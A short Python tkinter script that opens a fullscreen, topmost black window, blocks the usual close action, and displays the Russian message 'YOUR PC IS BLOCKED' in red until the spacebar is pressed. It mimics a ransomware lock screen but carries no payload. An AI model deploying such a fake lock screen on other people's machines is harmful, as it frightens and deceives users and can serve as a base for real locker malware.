import tkinter as tk
import sys

def close_window(event=None):
    root.destroy()
    sys.exit()

root = tk.Tk()
root.attributes('-fullscreen', True)
root.configure(bg='black')
root.bind('<space>', close_window)

# Предотвращаем закрытие обычными способами
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.wm_attributes("-topmost", True)

label = tk.Label(
    root,
    text="ВАШ ПК ЗАБЛОКИРОВАН",
    font=("Arial", 24),
    fg='red',
    bg='black',
    justify='center'
)
label.pack(expand=True)

root.mainloop()